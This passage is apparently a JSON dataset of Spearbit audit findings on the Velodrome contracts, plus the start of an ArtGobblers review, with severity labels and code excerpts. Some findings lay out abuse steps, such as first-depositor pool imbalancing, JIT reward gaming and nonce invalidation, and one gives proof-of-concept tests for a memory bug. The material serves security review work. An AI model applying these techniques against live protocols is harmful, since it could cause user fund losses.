        "body": "The variable COMMENT_DENOMINATOR is defined in both GovernorSimple and VetoGovernor to express a ratio of 4BPS:  VetoGovernor.sol#L48-L49: uint256 public constant override COMMENT_DENOMINATOR = 1_000_000_000;  VetoGovernor.sol#L633-L634: uint256 minimumWeight = (escrow.getPastTotalSupply(startTime) * commentWeighting) / 10_000; /// @audit ,! Incorrect denominator, should use COMMENT_DENOMINATOR   However, the denominator is left hardcoded as 10_000, which would change the minimum comment weight to 40% of the total supply.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Forwarder Gas Grief Still Possible if the req.gas is too close to the actual amount needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The Velodrome Forwarder code checks for gasLeft() and then performs a set of operations, which has a cost that is not computed. That gas cost will directly impact the post EIP-150 gasleft that will be available for the recipient call.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect result rounding in UniswapV2Library.getAmountIn()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "UniswapV2Library.getAmountOut() and UniswapV2Library.getAmountIn() are used to compute output and input amounts for swapping, respectively. By design (i.e. in Uniswap 2), these functions are counter- parties to each other: an input amount should have only one respective output amount (given that pool reserves and the swap fee don't change), and vice versa. However, the UniswapV2Library contract computes swap fee amount differently in the functions: 1. In UniswapV2Library.getAmountOut(), the fee is applied to the input amount before the output amount is calculated (UniswapV2Library.sol#L100). Notice that the fee amount (amountIn * 3 / 1000) is sub- tracted from the input amountthis results in an amount that's rounded up (the division rounds down, and thus the difference will be rounded up). In Uniswap V2, however, the result is always rounded down (UniswapV2Library.sol#L49). 2. UniswapV2Library.getAmountIn() is identical to Uniswap V2 (UniswapV2Library.sol#L56-L58). Thus, the result is rounded down. The difference in rounding in the two functions will impact \"exact output\" swaps: in some scenarios, the actual output amount will be greater than the one requested by the user by 1 wei; the input amount will be greater by 1 wei as well. Due to the maximum input amount check (V2SwapRouter.sol#L98), some \"exact output\" swaps can fail.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NFT cannot be withdrawn after all liquidity was removed from the position",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLGauge.decreaseStakedLiquidity(). The NFT position remains locked in the Gauge contract and cannot be removed until some new liquidity is provided. CLGauge.withdraw() fails when all The error happens because Position.update() fails when a position has 0 liquidity and the liquidityDelta is also 0: if (liquidityDelta == 0) { require(_self.liquidity > 0, \"NP\"); // disallow pokes for 0 liquidity positions liquidityNext = _self.liquidity; // ... Calling CLGauge.withdraw() on an empty position tiggers CLPool.stake() with the value of stakedLiquidity- Delta equal 0, which calls update() on the empty Gauge's position and also passes 0 in the liquidityDelta parameter.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "CLPool reward system presents risks in the case of deploying on a chain with a Mempool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The rewards math on CLPool is based on the idea that rewards are dripped each second exclusively to the active liquidity. A drip of rewards increases the rewardsGrowthGlobal crediting said growth to all active liquidity. The way this is done, in a swap, is by calling _updateRewardsGrowthGlobal on crossing ticks. See CLPool.sol#L708-L709: _updateRewardsGrowthGlobal(); /// @audit Called every time corssing happens It's worth noting that this accrual process is based on a delta time, meaning that it ignores changes that happen within the same block (see CLPool.sol#L853-L857): uint32 timestamp = _blockTimestamp(); uint256 _lastUpdated = lastUpdated; uint256 timeDelta = timestamp - _lastUpdated; if (timeDelta != 0) { // ... In a mempool system, nothing happens between blocks: all of the action happens inside of the block. Since accrual can be triggered at the start of the block, the most optimal LP strategy would be to claim said rewards, then unstake the liquidity and JIT said liquidity to end users as a means to gain swap fees. Liquidity Provision Mempool risks In the case of a deployment on a chain with a mempool, bundling would allow Active LP to:  Claim rewards until now.  Unstake.  JIT LP to gain swap fees.  Restake at the end of block, to farm the new drip of rewards. Ultimately this is a challenge in balancing effective volume against time spent in the pool. With the main issue being that, since actions / volume within a block is not counted, said gaming could be performed This will be negative for Passive LPs but neutral for end users. An interesting edge case of the above, meant to allow this on non-mempool system could be wrapped swaps, which would ensure a swap is MEVd back and forth as a way for the LP to ensure that their liquidity remains in the active range, this may be positive for end-users, and indifferent to passive LPs.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "unstakedFee may be paid for Pools with a killed gauge or that will never receive any votes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "All pool fees apply the splitFees formula which uses applyUnstakedFees, which will query for the unstakedFee (see CLPool.sol#L923-L924): uint256 _stakedFee = FullMath.mulDivRoundingUp(_unstakedFeeAmount, unstakedFee(), 1_000_000); Which will default to (see CLFactory.sol#L157-L164): function getUnstakedFee(address pool) external view override returns (uint24) { if (unstakedFeeModule != address(0)) { return IFeeModule(unstakedFeeModule).getFee(pool); } else { // Default unstaked fee is 10% return 100_000; } } This ultimately means that it's highly likely for all pools to always charge a 10% unstake fee. In the case of a pool that shouldn't receive votes, the loss would be marginal and should be \"self correcting\":  LPs will receive 10% lower fees.  Eventually some LPs will decide to vote to redistribute those fees as voting rewards.  This will trigger a \"race\" to vote and lock in that extra 10%. This dynamic should reach equilibrium and should also trigger people to engage with the system, at the cost of a less straightforward LPs proceess to gain fees. In the case of a killed Gauge however, the Voter will prevent calling notifyRewardAmount, and nobody will be able to vote on the Pool (see Voter.sol#L487-L497): function _distribute(address _gauge) internal { _updateFor(_gauge); // should set claimable to 0 if killed uint256 _claimable = claimable[_gauge]; if (_claimable > IGauge(_gauge).left() && _claimable > DURATION) { claimable[_gauge] = 0; IERC20(rewardToken).safeApprove(_gauge, _claimable); IGauge(_gauge).notifyRewardAmount(_claimable); IERC20(rewardToken).safeApprove(_gauge, 0); emit DistributeReward(_msgSender(), _gauge, _claimable); } } In those cases, the unstakeFee will be lost, and recovering it would create a scenario where the pool would be voted on again (which may be problematic if the Gauge was killed to prevent economic or governance attacks). Meaning that in those cases, the Pool will be underpaying swap fees by 10% and those fees will not be recoverable. This can be avoided by ensuring that the unstakeFee is zero when the Gauge is killed, which should be doable by the swapFeeManager and should be done in synch with killing the gauge.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent size for timestamp results in eventual desync",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The CLPool contract works with timestamps as a uint32 type which wouldn't overflow until the year 2106 and allows for gas savings with respect to storage costs. The CLGauge and VelodromeTimeLibrary uses uint256 for timestamps, which has the advantage of generally lesser runtime gas overhead and no practical worry of overflow. CLPool interacts with this contract and library, and has reliance on some of their timestamps and calculations. At the overflow point, the timestamps will desync from each other, and some prior functionality will no longer work as expected, with CLPool.sol#L862 being an example of this.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Outdated solidity compiler versions are being used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The repository is using compiler versions that are less than 0.8.0 which is not recommended. Newer versions incorporate enhanced security features, addressing vulnerabilities present in older releases. In the specific case of pragma versions >= 0.8.0 arithmetic operations are inherently safe which will naturally decrease the attack surface for this repository.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing validation check for unstakedFee in CLPool.applyUnstakedFees/unstakedFee, which might be more than 100%",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "unstakedFee returns a value that is used in the context of percentage, i.e. there is an implicit as- sumption that the return value should be <= 1_000_000 while in reality this is not enforced in the code and thus may cause an underflow in the value of unstakedFeeAmount, which will totally corrupt the values of feeGrowth- Global0X128, feeGrowthGlobal1X128, gaugeFees.token0, gaugeFees.token1.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getSwapFee and getUnstakedFee may return a value above their intended limits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "enableTickSpacing caps the max fee at 100_000 pips (10%). getUnstakedFee by default returns 100_000 and implicitly should never return any value above 1_000_000 pips. See CLFactory.sol#L167-L169: function enableTickSpacing(int24 tickSpacing, uint24 fee) public override { require(msg.sender == owner); require(fee <= 100_000); // ... In a scenario of malicious governance, either wanting to brick a pool or wanting to grief end users, swapFeeMod- ule and unstakedFeeModule could be set in a way that would bypass the intended limits for getSwapFee and getUnstakedFee. Proof of Concept  Call setSwapFeeModuleand setSwapFeeManager with an implementation that returns any value.  The pool will use said value, resulting in bricked functionality, or substantial loss to end users.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "NonfungiblePositionManager may cause losses if the tokensOwed0 overflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The casting of amount0 from uint256 to uint128 as well as the sum of tokensOwed overflow can cause a loss to users of the NonfungiblePositionManager for tokens that have very high decimals (see NonfungiblePositionManager.sol#L308-L322): position.tokensOwed0 += uint128(amount0); position.tokensOwed1 += uint128(amount1); if (!isStaked) { position.tokensOwed0 += uint128( FullMath.mulDiv( feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128, positionLiquidity, ,! FixedPoint128.Q128 ) ); position.tokensOwed1 += uint128( FullMath.mulDiv( feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128, positionLiquidity, ,! FixedPoint128.Q128 ) ); } The amount of tokens necessary for the loss is 3.4028237e+38. This is equivalent to 1e20 value with 18 decimals. This is not a new bug but a risk with the UniV3 implementation.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool First Depositor Imbalanced LPing for Stable Pool may cause loss to 2nd depositor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Stable Pools are seeded with the assumption that both tokens will be deposited at a 1:1 ratio. The Router quoteLiquidity function has the following comment (see Router.sol#L81-L82): /// @dev this only accounts for volatile pools and may return insufficient liquidity for stable pools function quoteLiquidity( // ... Meaning that it can be incorrect for Stable Pools. The Sync function allows to update reserves without minting tokens (see Pool.sol#L392-L394): function sync() external nonReentrant { _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1); ,! } The first deposit on a Stable Pool has got to be 1:1 and will mint the LP token at a 1:1 ratio (see Pool.sol#L307- L314): 18 uint256 _totalSupply = totalSupply(); // gas savings, must be defined here since totalSupply can update ,! if (_totalSupply == 0) { in _mintFee liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY; _mint(address(1), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens - cannot be address(0) if (stable) { ,! if ((_amount0 * 1e18) / decimals0 != (_amount1 * 1e18) / decimals1) revert DepositsNotEqual(); if (_k(_amount0, _amount1) <= MINIMUM_K) revert BelowMinimumK(); } // ... By using sync the first depositor is able to break this expectation. The first depositor can:  Donate imbalanced (Transfer tokens directly).  Sync (update reserves).  Mint with a small amount of tokens.  This will have rebased the LP token value (protected against donation by the min liquidity size).  This will have imbalanced the pool, while giving 100% of the underlying value to the first minter.  Subsequent depositors, that deposit in a balanced way, will lose some of their value due to the min math which requires a pro-rata contribution. (See Pool.sol#L316-L317): liquidity = Math.min((_amount0 * _totalSupply) / _reserve0, (_amount1 * _totalSupply) / _reserve1); A more likely scenario will be that smart projects will be able to seed pools at a depegged rate, and in some edge case some people will lose a % of the fair value of their LP tokens due to incorrect slippage checks (as they will assume the pool will accept at a 1:1 or close to 1:1 rate).",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CLPool.collectFees can result in unnecessary 0 value transfers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "If one of the gaugeFees tokens amounts to 1, it would result in a 0 value token transfer being fired off, due to the logic that tries to ensure the fee tokens never have their storage zeroed. In the normal case, this would yield unnecessary additional gas costs and events indicating 0-value transfers occurred. In the case of a non-standard ERC-20 token, it could result in the call to this function failing and reverting, thereby blocking the function and possibly the other non-zero token from being claimed until this condition is resolved.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factory setters intended to be callable once are not limited to a single successful call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The above setters, such as CLFactory.setNonfungiblePositionManager are documented to be settable only once. This is not the case, and each setter could be called multiple times with the right conditions. The current code design assumes it will be passed off to a contract that doesn't support calling that function again, however, it does inherit the permissions to indeed call and set again.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "IFeeModule could be called via ExcessivelySafeCall and limited gas to avoid bricking pools in case of governance attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "While the risk is very low, the current implementation of getSwapFee and getUnstakedFee calls a target, forwards all of it's available gas and will bubble a revert up to the caller. This would allow, by jumping multiple governance hoops, to brick a pool via the FeeModule. While a try/catch may seem like a valid mitigation, this would still leave the contract vulnerable to return bombs. It's worth noting, that in such a scenario people would still be able to withdraw their LP tokens as fees are computed only in swap and flash",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Increased surface area for potential future reentrancy attacks in SwapRouter and NonfungiblePosi- tionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The PeripheryPayments contract has 3 external functions allowing anyone to claim any excess tokens/eth from the contract: unwrapWETH9, sweepToken, refundETH. The implicit assumption is that contracts that inherit this functionality like SwapRouter and NonfungiblePositionManager should not hold any value in between transactions. In practice, funds might be held by the contracts during a transaction and in case an attacker has control over the program execution he might call these functions to drain this funds during the transaction execution. We were not able to find any exploitable code path in the current version of the code, but this behavior clearly increases the surface area for potential attacks in potential future versions of the code. It is also important to mention that the PeripheryPayments contract was originally out of scope for this review but in practice its implementation affects the derived contracts that are in scope.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_teamEmissions are using the decayed weekly rate instead of this week emissions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "In Minter.sol#L145-L146 uint256 _teamEmissions = (_rate * (_growth + _weekly)) / (MAX_BPS - _rate); /// @audit ,! new week and not the prev one | _emission is prev   _weekly is the team emissions are a percentage of this weeks emission. The current week emission is calculated as (see Minter.sol#L147): uint256 _required = _growth + _emission Meaning that this week's mint is comprised of _growth and _emission. _teamEmissions is instead using _weekly which is decayed by an additional week, causing a loss to the team. It's also worth considering it the divisor should be (MAX_BPS - _rate); or simply MAX_BPS as that's inflating the team emissions, making the _rate parameter harder to understand at first glance.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "VeloGovernor Quorum is set to 25% which may make most proposals never reach quorum",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Governance in DeFi tends to have fairly low turnouts, a 25% quorum may make passing governance proposals close to impossible. For example:  AAVE: 3%.  COMP: 5%.  UNI: 5%. Overall, the setting would ensure that only the most heated proposals would ever reach quorum.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CLPool.initialize implementation initializer could be re-initialized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Pools are deployed as proxies via the OZ Clones library, and their associated implementations require an initializer as replacement to a constructor. Just as a constructor, this should only be callable once, ideally on deployment. The implementation currently relies on checking that the factory state variable is null to be initializable. It is set via the _factory param in the initializer, and there is no non-zero check on it. If a null _factory param were to be passed, it would allow for post-deployment initialization by anyone.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SafeERC20.safeApprove() is deprecated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The SafeERC20.safeApprove function from the OpenZeppelin's contracts used by the project is deprecated (SafeERC20.sol#L30-L37): /** * @dev Deprecated. This function has issues similar to the ones found in * {IERC20-approve}, and its usage is discouraged. * * Whenever possible, use {safeIncreaseAllowance} and * {safeDecreaseAllowance} instead. */ function safeApprove(IERC20 token, address spender, uint256 value) internal { // ...",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CLFactory.enableTickSpacing() allows setting a 0 fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Due to insufficient input validation, the CLFactory.enableTickSpacing() function lets the owner set 0 fee to a tick spacing. If this happens, the tick spacing is pushed into the _tickSpacings array, but the tick spacing won't still be active because fees must be positive (CLFactory.sol#L80). When CLFactory.enableTickSpacing() is called again to set a correct fee for the tick spacing, the tick spacing will be pushed into the array again, causing duplicates in the array.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Staked liquidity can be increased in a killed gauge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLGauge.increaseStakedLiquidity() allows to increase liquidity in a killed gauge. Unlike CL- Gauge.deposit(), it doesn't check if the gauge is active. This allows to bypass the gauge liveliness check in CLGauge.deposit(): 1. A user stakes liquidity in an alive gauge via CLGauge.deposit(). 2. The user removes all their staked liquidity via CLGauge.decreaseStakedLiquidity(). 3. The gauge gets killed after some time. 4. The user stakes liquidity in the killed gauge by calling CLGauge.increaseStakedLiquidity().",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary zero-value initialization on state variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The two state variables are re-initialized to 0. This introduces unnecessary overhead with solidity on the deployment step, which raises gas ~2000 units per unnecessary assignment to 0.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool unnecessarily uses fallback Context._msgSender()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The Pool contract appears to unnecessarily be using _msgSender() as it is using it from OZ's fallback Context contract without any intermediary meta transaction libraries between it. Thereby, it is just falling back to msg.sender but with unnecessary gas overhead. It only makes sense to keep this if Pool may be intended to be an import of another contract that will support meta transactions, or if it's planned to be eventually implemented.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "for loop increments could be unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Solc 0.8 introduces checked arithmetic by default. A number of contracts using this version have for loops, that could use unchecked blocks for the incrementing variable, with the potential to save a fair amount in gas costs for longer running loops.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "CLPool state variables can be better tightly packed for gas efficiency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The CLPool contract declares a number of smaller type variables that could be packed into shared storage slots. Currently, their alignment appears supoptimal for gas efficiency purposes, meaning there are un- necessary SLOAD and SSTORE ops occurring.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "CLPool.swap gas savings by not repeating no-op operations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLPool.swap performs in-memory operations. On each swap step, it calls the fee function, which is idempotent and as such its result can be cached to save around 400 gas per swap step. Similarly CLPool.swap calls _updateRewardsGrowthGlobal each time it crosses a tick. The function will accrue past rewards only when timeDelta != 0 meaning it's not necessary to call it after the first tick cross. Omitting the call should save at least 100 gas for each tick crossed when checking the timestamp for last update.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "CLFactory SLOAD gas savings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The old owner in CLFactory.sol#L104-L109 is a storage variable and is read twice, you can save gas by caching it. This also applies to:  setSwapFeeManager.  setUnstakedFeeManager.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "DURATION should be replaced with VelodromeTimeLibrary.WEEK to minimize the risk of a future error in CLGauge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "In the current version of the code, DURATION and WEEK both hold the same value of 7 days and are being used interchangeably in CLGauge and VelodromeTimeLibrary. However, CLGauge.sol#L337 may underflow in case DURATION < timeUntilNext which may happen in future versions of the code if WEEK holds a value greater than 7 days. This underflow will totally corrupt the rewards accounting logic in CLGauge.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "An operator can invalidate permits on behalf of the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "This finding is more of a gotcha than a real risk, as a malicious operator can just steal the tokens. This could be useful in whitehat attempts. In the case of a nonce being signed by an owner, the operator could:  Transfer to self (becomes owner of token).  Sign a new permit.  Use the permit to raise the nonce. As a way to deny usage of nonces for the user (see NonfungiblePositionManager.sol#L421-L423): function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) { return uint256(_positions[tokenId].nonce++); }",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Nitpick: Dispatcher comment uses bytes instead of Route",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "In the following instances:  Dispatcher.sol#L132  Dispatcher.sol#L143 Dispatcher states: // equivalent: abi.decode(inputs, (address, uint256, uint256, bytes, bool)) But it actually decodes Route[] instead of bytes",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Voting is using a snapshot in the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The Governors propose function stores a proposal in the following way (see VetoGovernor.sol#L287- L297): _proposals[proposalId] = ProposalCore({ voteStart: snapshot.toUint64(), proposer: proposer, __gap_unused0: 0, voteEnd: deadline.toUint64(), __gap_unused1: 0, executed: false, canceled: false, vetoed: false }); The snapshot value is computed as (see VetoGovernor.sol#L284-L285): uint256 snapshot = currentTimepoint + votingDelay(); Which is used as follows (see GovernorSimple.sol#L558): uint256 weight = _getVotes(account, tokenId, proposal.voteStart, params); Which will use the voteStart as the timestamp to look into, which is a time in the future. While no specific attack has been found, it's worth keeping in mind that this can allow various entities to change their:  Delegation.  Spot amounts.  Locks. Which could result in drastic changes in voting power.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "LateQuorum is possible you will have to always veto malicious proposals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "As described in these resources (1, 2): the governor requires that quorum is met before the deadline, this means that a last second quorum may be reached for malicious proposals.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "CLFactory.enableTickSpacing is public but unused internally, could be used in constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The enableTickSpacing function has a public visiblity specifier, but it is currently unused internally.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "UniversalRouter.Permit2Payments has unused imports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "In Permit2Payments.sol#L6-L7 import {Constants} from import {RouterImmutables} from   ../libraries/Constants.sol  ; ../base/RouterImmutables.sol  ; are unused imports",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "UniversalRouter/Dispatcher placeholder comment is wrong",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The comment states // placeholder area for commands 0x22-0x3f However, 0x22 is used for APPROVE_ERC20.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "Usage of duplicating libraries",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The CLGauge contract imports and uses SafeERC20 and TransferHelper libraries, which implement identical functionality: safe transferring and approval of ERC20 tokens.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Informational"
        ]
    },
    {
        "title": "The claimGobbler function does not enforce the MINTLIST_SUPPLY on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There is a public constant MINTLIST_SUPPLY (2000) that is supposed to represent the number of gobblers that can be minted by using merkle proofs. However, this is not explicitly enforced in the claimGobbler function and will need to be verified off-chain from the list of merkle proof data. The risk lies in the possibility of having more than 2000 proofs.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Feeding a gobbler to itself may lead to an infinite loop in the off-chain renderer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "The contract allows feeding a gobbler to itself and while we do not think such action causes any issues on the contract side, it will nevertheless cause potential problems with the off-chain rendering for the gob- blers. The project explicitly allows feeding gobblers to other gobblers. In such cases, if the off-chain renderer is designed to render the inner gobbler, it would cause an infinite loop for the self-feeding case. Additionally, when a gobbler is fed to another gobbler the user will still own one of the gobblers. However, this is not the case with self-feeding,.",
        "labels": [
            "Spearbit",
            "ArtGobblers",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The function toString() does not manage memory properly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf",
        "body": "There are two issues with the toString() function: 1. It does not manage the memory of the returned string correctly. In short, there can be overlaps between memory allocated for the returned string and the current free memory. 2. It assumes that the free memory is clean, i.e., does not explicitly zero out used memory. Proof of concept for case 1: function testToStringOverwrite() public { string memory str = LibString.toString(1); uint freememptr; uint len; bytes32 data; uint raw_str_ptr; assembly { // Imagine a high level allocation writing something to the current free memory. // Should have sufficient higher order bits for this to be visible mstore(mload(0x40), not(0)) freememptr := mload(0x40) // Correctly allocate 32 more bytes, to avoid more interference mstore(0x40, add(mload(0x40), 32)) raw_str_ptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"memptr: \", freememptr); emit log_named_uint(\"str: \", raw_str_ptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); } Logs: memptr: : 256 str: : 205 len: : 1 data: : 0x31000000000000000000000000000000000000ffffffffffffffffffffffffff The key issue here is that the function allocates and manages memory region [205, 269) for the return variable. However, the free memory pointer is set to 256. The memory between [256, 269) can refer to both the string and another dynamic type that's allocated later on. Proof of concept for case 2: 5 function testToStringDirty() public { uint freememptr; // Make the next 4 bytes of the free memory dirty assembly { let dirty := not(0) freememptr := mload(0x40) mstore(freememptr, dirty) mstore(add(freememptr, 32), dirty) mstore(add(freememptr, 64), dirty) mstore(add(freememptr, 96), dirty) mstore(add(freememptr, 128), dirty) } string memory str = LibString.toString(1); uint len; bytes32 data; assembly { freememptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"str: \", freememptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); assembly { freememptr := mload(0x40) } emit log_named_uint(\"memptr: \", freememptr); } Logs: str: 205 len: : 1 data: : 0x31ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff memptr: : 256 In both cases, high level solidity will not have issues decoding values as this region in memory is meant to be empty. However, certain ABI decoders, notably Etherscan, 